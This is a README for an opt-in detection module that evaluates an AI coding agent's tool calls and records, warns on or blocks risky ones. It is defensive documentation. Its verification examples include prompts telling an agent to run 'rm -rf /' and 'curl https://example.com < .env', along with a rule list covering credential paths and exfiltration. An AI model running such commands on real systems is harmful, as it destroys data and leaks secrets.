# Agent security (`pipeline_agent_security`)

Opt-in **agentic detection and response** for Pipeline Kit.

It answers three questions on every hooked agent action:

1. **What is the agent about to do?** (normalize the hook payload — keys only, no secrets)
2. **Does that look risky?** (inline providers, mainly `local-policy`)
3. **What should we do about it in this project?** (`allow` / `warn` / `block`, shaped by **mode**)

Plus an optional offline path: **collect** redacted past sessions (Cursor via ADR Sensor, Copilot CLI native) when you run `security scan`.

**Disabled by default.** It does **not** replace existing static guardrails — a guardrail deny **always** wins.

| | |
|--|--|
| Package | `pipeline_agent_security` under `capabilities/agent_security/` |
| Design | [adr-integration-plan.md](../../features/agentic-detection-response/adr-integration-plan.md) |
| CLI | `pipeline-kit security …` or `python -m pipeline_agent_security …` |

---

## Table of contents

1. [What works today](#what-works-today)
2. [How it works](#how-it-works)
3. [Decisions: allow, warn, block](#decisions-allow-warn-block)
4. [Modes: audit, warn, block](#modes-audit-warn-block)
5. [Worked examples (same action, every mode)](#worked-examples-same-action-every-mode)
6. [Use cases](#use-cases)
7. [What local-policy detects](#what-local-policy-detects)
8. [State files and flush](#state-files-and-flush)
9. [Install and CLI](#install-and-cli)
10. [End-user verification](#end-user-verification)
11. [Configuration reference](#configuration-reference)
12. [Privacy](#privacy)
13. [Layout and extending](#layout-and-extending)
14. [Known gaps](#known-gaps)

---

## What works today

| Area | Status |
|------|--------|
| Local policy (inline): destructive shell, exfil, credential paths, risky MCP, outbound net, secret-shaped writes | Works |
| Modes: `audit` / `warn` / `block` | Works |
| Effective actions: `allow` / `warn` / `block` | Works |
| Findings ledger + decisions ledger + obs projection / `flush` | Works |
| `pipeline-kit security` CLI | Works |
| Hooks: `before-shell`, `before-mcp`, `before-read`, `pre-write` | Works when `enabled: true` **and** the IDE invokes hooks |
| Cursor collection via `adr-sensor` 1.0.0 (macOS/Linux strongest) | Works |
| Windows Cursor path discovery (APPDATA) | Reports honestly; upstream parser may still miss DB |
| Copilot CLI native session collection | Works when session files exist |
| VS Code Copilot Chat scraping | Not supported (by design) |
| Third-party providers (`pipeline_kit.agent_security.providers`) | Supported |

---

## How it works

### Two independent doors

| Door | When it runs | What it writes | Changes agent behavior? |
|------|----------------|----------------|-------------------------|
| **A — Live hooks** | IDE/agent fires a pre-tool hook (read / shell / MCP / write) | `findings.jsonl`, `decisions.jsonl` (and may project to obs) | Yes — only if mode is `warn` or `block` and rules match |
| **B — Offline scan** | You run `pipeline-kit security scan` | `session-events.jsonl`, checkpoints, health | **No** — collection only |

A chat reply that **never calls a tool** does not open door A.  
Asking “does `.env` exist?” and getting “no” from the model alone is **not** a security check.

```
Agent wants tool
       │
       ▼
 Existing pack guardrails (path allowlist, secrets, shell deny lists, …)
       │
       ├─ deny ──► apply_agent_security(guardrail_denied=True)
       │              still may record findings
       │              effective action stays BLOCK
       │
       └─ allow ──► apply_agent_security(…)
                      normalize payload → SecurityEvent
                      local-policy (+ other inline providers)
                      coordinator merges + applies MODE
                      persist findings/decisions
                      return allow | warn-as-allow | block
```

### Pipeline inside the package

```
hook payload
    → normalize.py     SecurityEvent (command/path/tool name; arg KEYS only)
    → coordinator      load inline providers, timeout, merge recommended actions
    → mode mapping     audit→always ALLOW; warn→WARN; block→BLOCK if thresholds
    → guardrail clamp  existing deny cannot become allow
    → ledger           findings.jsonl + decisions.jsonl
    → optional obs     security_finding rows (redacted)
```

### Fail-open by default

- `fail_mode: open` (default): provider crash or timeout → do **not** invent a block.
- `PIPELINE_ALLOW_ALL=1` or portal-owned session → hooks **skip** agent_security evaluation (escape hatch for maintainers / external portal).
- Missing `adr-sensor` → scan still runs Copilot collector; Uber ADR reports `provider_unavailable`.

---

## Decisions: allow, warn, block

These are **actions** on one evaluation (what the coordinator returns).

| Action | Meaning to the agent | Hook behavior | Ledger |
|--------|----------------------|---------------|--------|
| **allow** | Proceed | Permission granted; normal reason text | Decision row; findings only if some rule matched but mode softened to allow (e.g. audit) |
| **warn** | Proceed, but surface a warning | Still **allowed**; reason often prefixed `warning: …` | Finding + decision with effective `warn` |
| **block** | Stop this tool call | Permission **denied** | Finding + decision with effective `block` |

**Precedence when merging providers:** `block > warn > allow`.

**Guardrail rule:** if pack guardrails already denied, final action is always **block**, regardless of mode. Security findings may still be stored for forensics.

`decision_allows(decision)` is true for both `allow` and `warn`; only `block` denies.

---

## Modes: audit, warn, block

Mode is a **project policy knob** in `.pipeline/config.json` → `agent_security.mode`.  
It maps each provider **recommendation** to an **effective** action:

| Mode | If rules say ALLOW | If rules say WARN | If rules say BLOCK |
|------|--------------------|-------------------|--------------------|
| **`audit`** | allow | **allow** (still recorded) | **allow** (still recorded) |
| **`warn`** | allow | **warn** (allow + message) | **warn** (allow + message) |
| **`block`** | allow | **warn** | **block** only if severity ≥ `block.minimum_severity` **and** confidence ≥ `block.minimum_confidence`; otherwise **warn** |

Defaults for block thresholds:

```json
"block": { "minimum_severity": "high", "minimum_confidence": 0.9 }
```

### Mental model

| Mode | Camera | Alarm | Locked door |
|------|--------|-------|-------------|
| **audit** | On | Off | Off (security never locks) |
| **warn** | On | On | Off (security never locks) |
| **block** | On | On | On for high-confidence BLOCK recommendations |

Pack guardrails can still lock the door in every mode.

### When to use which

| Mode | Use when |
|------|----------|
| **audit** | First enable; baseline noise; compliance “record only”; shared dev machines |
| **warn** | Team should notice risky tools without breaking flow |
| **block** | Sensitive repos after you’ve reviewed audit/warn findings for false positives |

```powershell
pipeline-kit security install . --mode audit
pipeline-kit security install . --mode warn
pipeline-kit security install . --mode block
```

---

## Worked examples (same action, every mode)

Assume `enabled: true`, `local-policy` on, default block thresholds, and **no** prior guardrail deny.  
Examples are illustrative of **effective** outcomes.

### Example 0 — Clean allow (no rule match)

**Action:** read `README.md` or run `python -m pytest tests/test_agent_security.py -q`.

| Mode | Effective | User sees | Ledger |
|------|-----------|-----------|--------|
| audit | **allow** | Normal success | Decision `allow`, reason like `local-policy: no match` (if persisted path runs) |
| warn | **allow** | Same | Same |
| block | **allow** | Same | Same |

**Copilot prompt:**

> Run `python -m pytest tests/test_agent_security.py -q` and summarize the result.

**Verify:**

```powershell
pipeline-kit security status .
# findings count should not jump for a clean action (or only unrelated older rows)
```

---

### Example 1 — Credential path read (`.env`)

**Action:** pre-read tool on path ending in `.env`  
**local-policy:** `path.credential` → recommended **BLOCK**, severity critical, confidence ~0.97  

| Mode | Effective | User / agent experience | What to look for in ledgers |
|------|-----------|-------------------------|-----------------------------|
| **audit** | **allow** | Read may still proceed (unless pack secrets guardrail denies first) | `findings.jsonl`: `path.credential`; `decisions.jsonl`: `action=allow`, `mode=audit` |
| **warn** | **warn** | Read **allowed** but reason `warning: Protected credential path referenced` | finding + decision `action=warn` |
| **block** | **block** | Read **denied** by security (meets high/0.9) | finding + decision `action=block` |

**Important:** if the model answers “`.env` is missing” **without** calling the read tool, **nothing is evaluated**. Force a tool:

> Use your file-read tool on `.env` at the repo root. If missing, still attempt the read. Do not print secret values.

Optional dummy file:

```powershell
Set-Content .env "FAKE_KEY=not-a-real-secret"
# …run the prompt…
Remove-Item .env
```

**Verify:**

```powershell
Get-Content .pipeline\state\security\findings.jsonl | Select-Object -Last 2
Get-Content .pipeline\state\security\decisions.jsonl | Select-Object -Last 2
```

Expect rule id `path.credential` and `effective_action` / `action` matching the table.

**Forced evaluator check (no IDE):**

```powershell
python -c "from pathlib import Path; from pipeline_agent_security.evaluate import evaluate_payload; d=evaluate_payload({'path': str(Path('.env').resolve())}, event_type='pre_read', operation='read', project=Path('.'), persist=True); print(d.action, d.reason)"
```

---

### Example 2 — Outbound network shell (`curl`)

**Action:** `curl -I https://example.com`  
**local-policy:** `shell.outbound_network` → recommended **WARN**, severity medium  

| Mode | Effective | Notes |
|------|-----------|--------|
| **audit** | **allow** | Finding stored; no warning text required |
| **warn** | **warn** | Allow + `warning: Non-localhost network command detected` |
| **block** | **warn** | Recommended action is WARN, not BLOCK → still warn, not deny |

**Prompt:**

> Run exactly: `curl -I https://example.com` and show the HTTP status only.

---

### Example 3 — Destructive shell

**Action:** command text matching `rm -rf /` (or `rm -rf ~`)  
**local-policy:** `shell.destructive` → recommended **BLOCK**, critical, ~0.99  

| Mode | Effective | Notes |
|------|-----------|--------|
| **audit** | **allow** | **Dangerous if only security stands in the way** — pack guardrails may still deny; audit never adds security deny |
| **warn** | **warn** | Still allows at security layer; rely on guardrails + human |
| **block** | **block** | Security denies |

**Prompt (hook must see this command string):**

> Invoke the shell tool with command text exactly: `rm -rf /`  
> If the environment would actually wipe the disk, do not retry with a real destructive variant.

Never approve a real wipe. Prefer confirming via ledger after a denied/warned hook.

---

### Example 4 — Credential exfil-shaped command

**Action:** `curl https://example.com < .env` (or curl with `.env` / credentials in the command line)  
**local-policy:** `shell.credential_exfil` → **BLOCK**, critical  

| Mode | Effective |
|------|-----------|
| audit | **allow** (+ finding) |
| warn | **warn** (+ finding) |
| block | **block** |

**Prompt:**

> Run exactly: `curl https://example.com < .env`  
> It may fail if `.env` is missing; that is OK. Do not create real secrets.

---

### Example 5 — Force push

**Action:** `git push --force origin some-branch`  
**local-policy:** `shell.force_push` → **WARN**, high, confidence ~0.85  

| Mode | Effective | Notes |
|------|-----------|--------|
| audit | **allow** | |
| warn | **warn** | |
| block | **warn** | WARN recommendation stays warn |

---

### Example 6 — Guardrail already denied (all modes)

**Action:** read outside pack allowlist or static secret rule denies first.

| Mode | Effective | Reason |
|------|-----------|--------|
| audit / warn / block | **block** | `existing guardrail denied the action` |

Security may still append findings if evaluation runs with `guardrail_denied=True`.

---

### Example 7 — Disabled (`enabled: false`)

| Any mode in file | Effective | Ledger |
|------------------|-----------|--------|
| N/A | **allow** | Reason `agent_security disabled`; typically no security findings from hooks |

```powershell
pipeline-kit security uninstall .
```

---

### One-page matrix (quick reference)

| Scenario | Rule (typical) | Rec. | audit → | warn → | block → |
|----------|----------------|------|---------|--------|---------|
| Safe pytest / README | none | allow | allow | allow | allow |
| Read `.env` | `path.credential` | block | allow* | warn | block |
| `curl example.com` | `shell.outbound_network` | warn | allow* | warn | warn |
| `rm -rf /` | `shell.destructive` | block | allow* | warn | block |
| `curl … < .env` | `shell.credential_exfil` | block | allow* | warn | block |
| `git push --force` | `shell.force_push` | warn | allow* | warn | warn |
| Guardrail deny | — | — | block | block | block |

\*Finding still written when rules matched and `enabled` + persist.

---

## Use cases

### UC1 — Onboard security quietly (audit)

**Goal:** Know what agents touch without breaking developers.

```powershell
pipeline-kit security install . --mode audit
# work for a week
Get-Content .pipeline\state\security\findings.jsonl
pipeline-kit security flush .
```

**Success:** findings accumulate; nobody reports new random denials from security.

### UC2 — Teach the team (warn)

**Goal:** Surface “that looks like credential access” in the tool permission reason.

```powershell
pipeline-kit security install . --mode warn
```

**Success:** risky tools still run (unless guardrails deny); reasons show `warning: …`; decisions show `warn`.

### UC3 — Protect a high-sensitivity repo (block)

**Goal:** Stop high-confidence credential path / destructive / exfil patterns.

```powershell
pipeline-kit security install . --mode block
# tune if needed:
# "block": { "minimum_severity": "critical", "minimum_confidence": 0.95 }
```

**Success:** `.env` reads and `rm -rf /`-class commands denied; normal tests still allow.  
**Rollback:** `pipeline-kit security install . --mode audit`.

### UC4 — Incident / forensics (scan + findings)

**Goal:** After a scare, see recent agent session shapes and security hits.

```powershell
pipeline-kit security scan .
pipeline-kit security status .
Get-Content .pipeline\state\security\session-events.jsonl | Select-Object -Last 20
Get-Content .pipeline\state\security\findings.jsonl | Select-Object -Last 20
```

**Success:** redacted tool names/keys only; no raw tokens in JSONL.

### UC5 — Feed platform observability (flush)

**Goal:** Security signals appear next to other pipeline obs events.

```powershell
pipeline-kit security flush .
Select-String -Path .pipeline\state\obs\events.jsonl -Pattern security_finding | Select-Object -Last 5
```

**Success:** `projected` ≥ 1 on first flush after new findings; second flush `projected: 0`.  
Checkpoint: `.pipeline/state/security/obs-projection-offset.txt`.

### UC6 — CI / maintainer confidence (pytest)

```powershell
python -m pytest tests/test_agent_security.py -q
```

**Success:** unit tests green (isolated homes; no dependence on your real Cursor history).

### UC7 — Multi-agent / Copilot CLI estate

**Goal:** Inventory CLI agent sessions on a laptop.

```powershell
pipeline-kit security doctor .
pipeline-kit security scan . --source copilot-cli
```

**Success:** doctor lists Copilot roots when present; scan health `ok` or clear `not found`.

### UC8 — Turn off without destroying evidence

```powershell
pipeline-kit security uninstall .
```

**Success:** `enabled false`; `findings.jsonl` / `session-events.jsonl` retained.

### UC9 — False positive handling

1. Note `rule_id` from findings.  
2. Switch to `audit` or `warn`.  
3. File a rule tweak / provider exclusion (extend `local-policy` or disable a provider in config).  
4. Re-test the same prompt.

### UC10 — Portal or allow-all sessions

If `PIPELINE_ALLOW_ALL=1` or portal owns the gate, **live security evaluation is skipped**.  
Use this only for controlled maintenance; it explains “I prompted Copilot and got zero findings.”

---

## What local-policy detects

Built-in deterministic rules (`providers/local_policy.py`):

| Rule id | Event | Typical recommendation | Severity |
|---------|-------|------------------------|----------|
| `shell.destructive` | shell | block | critical |
| `shell.credential_exfil` | shell | block | critical |
| `shell.force_push` | shell | warn | high |
| `shell.remote_transfer` | shell | block | high |
| `shell.outbound_network` | shell | warn | medium |
| `shell.secret_keys_with_network` | shell | high / block-oriented | high |
| `path.credential` | read/write path | block | critical |
| `write.secret_named_file` | write | block | high |
| `mcp.risky_tool` | MCP tool name | block | high |
| `mcp.path_argument` | MCP + credential path keys | block | high |

Credential path patterns include `.env`, `credentials.json`, `*.pem`, `id_rsa`, kube/aws config-style paths, etc.

---

## State files and flush

Directory: `.pipeline/state/security/` (configurable via `state_dir`).

| File | Written by | Meaning |
|------|------------|---------|
| `findings.jsonl` | Live evaluate (rules matched) | One finding per rule hit |
| `decisions.jsonl` | Live evaluate | Effective allow/warn/block per event |
| `session-events.jsonl` | `security scan` | Redacted session summaries |
| `provider-health.jsonl` | scan / doctor paths | Collector health |
| `uber-adr-checkpoint.json` | ADR scan | Dedup cursor sessions |
| `copilot-cli-checkpoint.json` | Copilot scan | Dedup CLI sessions |
| `obs-projection-offset.txt` | `flush` | Byte offset into findings already copied to obs |
| `adr-output/` | adr-sensor workspace | Upstream working files |

### What `flush` does

```powershell
pipeline-kit security flush .
# → { "projected": N, "offset": bytes }
```

1. Read findings from last offset.  
2. Slim each row (`kind=security_finding`, drop evidence detail strings).  
3. Append to `.pipeline/state/obs/events.jsonl`.  
4. Advance `obs-projection-offset.txt`.

Does **not** re-scan sessions, enable/disable security, or upload by itself.

---

## Install and CLI

```bash
pip install -e .
pip install -e ".[agent-security]"   # optional adr-sensor for Cursor parse

pipeline-kit security install . --mode audit
pipeline-kit security status .
pipeline-kit security doctor .
pipeline-kit security scan .
pipeline-kit security flush .
pipeline-kit security uninstall .

# module form (--project is BEFORE the subcommand)
python -m pipeline_agent_security --project . status
python -m pipeline_agent_security --project . install --mode warn

# maintainers: python install.py security …  (routes to full CLI)
```

| Command | Purpose |
|---------|---------|
| `install [--mode]` | `enabled=true`, set mode, ensure state dir |
| `uninstall` | `enabled=false`, keep ledgers |
| `status` | enabled, mode, finding/session counts, providers |
| `doctor` | config, provider health, Cursor/Copilot path discovery |
| `scan` | offline collectors |
| `flush` | findings → obs ledger |

Also: `pipeline-kit features enable agent-security` (feature flag helper).

---

## End-user verification

### A. Config door is open

```powershell
pipeline-kit security status .
```

Pass: `enabled True`, expected `mode`.

### B. Offline door

```powershell
pipeline-kit security scan .
pipeline-kit security scan .   # new_events → 0
```

### C. Live door (hooks)

1. Mode `warn` or `block`.  
2. Agent **must** call a hooked tool (read `.env`, shell `curl …`).  
3. Check:

```powershell
pipeline-kit security status .          # findings count increases
Get-Content .pipeline\state\security\findings.jsonl | Select-Object -Last 3
Get-Content .pipeline\state\security\decisions.jsonl | Select-Object -Last 3
```

| Result | Interpretation |
|--------|----------------|
| findings stay 0 after real tool call | Hooks not firing for that IDE, or `PIPELINE_ALLOW_ALL`, or portal skip |
| finding + decision allow in audit | Live path OK, mode is camera-only |
| finding + warn in warn mode | Live path OK |
| finding + block in block mode | Enforcement OK |

### D. Safe prompts vs signal prompts

**Safe (expect allow):** pytest, read README, write `tmp-smoke.txt`.  
**Signal:** read `.env` via tool; `curl -I https://example.com`; `curl … < .env`; shell text `rm -rf /` (do not really wipe).

### E. Automated

```powershell
python -m pytest tests/test_agent_security.py -v -rs
```

---

## Configuration reference

In `.pipeline/config.json` (template: `kit/pipeline/config.json`):

```json
{
  "agent_security": {
    "_note": "Opt-in agentic detection and response. Disabled by default.",
    "enabled": false,
    "mode": "audit",
    "sources": ["cursor", "copilot-cli"],
    "providers": [
      {"name": "local-policy", "enabled": true, "priority": 100, "inline": true},
      {"name": "uber-adr-sensor", "enabled": true, "priority": 200, "inline": false},
      {"name": "copilot-cli-native", "enabled": true, "priority": 210, "inline": false}
    ],
    "inline_timeout_ms": 100,
    "fail_mode": "open",
    "block": {
      "minimum_severity": "high",
      "minimum_confidence": 0.9
    },
    "capture": {
      "prompts": false,
      "tool_results": false,
      "max_field_chars": 4000
    },
    "redact": [".env", "*secret*", "*credential*"],
    "retention_days": 14,
    "export_observability_projection": true,
    "state_dir": ".pipeline/state/security"
  }
}
```

| Field | Meaning |
|-------|---------|
| `enabled` | Master switch for live evaluate + persist |
| `mode` | `audit` \| `warn` \| `block` |
| `sources` | Offline scan source filter |
| `providers` | Enable/priority/inline flags |
| `inline_timeout_ms` | Budget for synchronous providers in hooks |
| `fail_mode` | `open` (default) or `closed` (timeout may block) |
| `block.*` | Thresholds only applied in `block` mode |
| `export_observability_projection` | Also write slim rows when persisting (flush still for backlog) |
| `state_dir` | Relative to project unless absolute |

---

## Privacy

- No full prompts, tool argument **values**, or tool results in security ledgers.
- Evidence: rule id + field name + generic detail (not secret contents).
- Obs projection: drops evidence detail strings; keeps counts/rule ids.
- Session scan: tool **names** + argument **keys** only.
- Does not scrape VS Code Copilot Chat storage.

---

## Layout and extending

| File | Purpose |
|------|---------|
| `models.py` | Events, findings, decisions, merge helpers |
| `config.py` | Load/save/validate `agent_security` |
| `normalize.py` | Hook payload → `SecurityEvent` |
| `evaluate.py` | Hook/CLI entry; persist |
| `ledger.py` | findings/decisions/obs/flush |
| `commands.py` | CLI implementation |
| `providers/local_policy.py` | Inline rules |
| `providers/coordinator.py` | Timeout, merge, mode, guardrail clamp |
| `providers/registry.py` | Built-ins + entry points |
| `providers/uber_adr.py` | ADR Sensor adapter + scan |
| `providers/copilot_cli.py` | Native Copilot CLI collector |
| `__main__.py` | `python -m pipeline_agent_security` |

### Third-party provider

```toml
[project.entry-points."pipeline_kit.agent_security.providers"]
my-detector = "my_pkg.security:MyProvider"
```

Implement `name`, `capabilities`, and optionally `evaluate` / `collect` / `health`.  
Inline providers participate in live hook decisions; non-inline are for collection/scan-style flows.

---

## Known gaps

- adr-sensor 1.0.0 Cursor parser is strongest on macOS/Linux; Windows may report discovery yet still get parser `source_not_found`.
- No VS Code Copilot Chat collection (intentional).
- Cross-turn correlation (read `.env` in turn 1, exfil in turn 2) is minimal today.
- Live checks require **IDE hook registration** + real tool calls; chat-only answers do not exercise security.
- `PIPELINE_ALLOW_ALL=1` disables live agent_security in hooks by design.

---

## Quick start (copy-paste)

```powershell
pip install -e .
pipeline-kit security install . --mode audit
pipeline-kit security doctor .
pipeline-kit security scan .
pipeline-kit security status .

# after real hooked tool use:
Get-Content .pipeline\state\security\findings.jsonl -ErrorAction SilentlyContinue | Select-Object -Last 5

pipeline-kit security install . --mode warn    # optional
pipeline-kit security install . --mode block   # optional, after review
pipeline-kit security flush .
pipeline-kit security uninstall .              # when done; keeps history
```
